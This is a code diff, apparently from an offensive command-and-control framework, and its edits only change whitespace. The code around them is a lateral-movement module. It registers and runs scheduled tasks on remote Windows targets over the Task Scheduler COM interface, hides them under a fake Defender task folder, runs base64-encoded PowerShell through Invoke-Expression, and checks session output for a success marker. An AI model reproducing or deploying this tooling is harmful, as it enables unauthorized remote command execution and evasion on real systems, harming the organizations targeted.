@@ -96,12 +96,12 @@ $Cmd     = '{cmd_esc}'
 $Cleanup = {cleanup_ps}
 
 foreach ($T in $Targets) {{
-	
+
 	$service = New-Object -ComObject "Schedule.Service"
-	
+
 	$service.Connect($T)
 	$root = $service.GetFolder("\\")
-	
+
 	$taskDef = $service.NewTask(0)
 
 	$trigger = $taskDef.Triggers.Create(1)
@@ -119,13 +119,13 @@ foreach ($T in $Targets) {{
 
 	$taskName   = "GunnerTask_$([guid]::NewGuid().ToString('N').Substring(0,8))"
 	$folderPath = "\\Microsoft\\Windows\\Defender"
-	
+
 	try {{ $folder = $root.GetFolder($folderPath) }}
 	catch {{ $folder = $root.CreateFolder($folderPath, $null) }}
 
-	
+
 	$regTask = $folder.RegisterTaskDefinition($taskName, $taskDef, 6, $null, $null, 5)
-	
+
 	$regTask.Run($null) | Out-Null
 
 	if ($Cleanup) {{
@@ -144,7 +144,7 @@ Write-Output "THE BUMBACLUT IN THE BASKET"
 			f".GetString([Convert]::FromBase64String(\"{b64}\")); "
 			"Invoke-Expression $ps"
 		)
-	
+
 		sess = session_manager.sessions.get(sid)
 		if not sess:
 			return brightred + "[!] Invalid session"
@@ -182,7 +182,7 @@ Write-Output "THE BUMBACLUT IN THE BASKET"
 			else:
 				return brightred + "[!] Unknown transport detected!"
 
-		
+
 		if out:
 			if "THE BUMBACLUT IN THE BASKET" in out:
 				return brightgreen + f"[+] Successfully executed command on Target via RPC COM Scheduled task API"
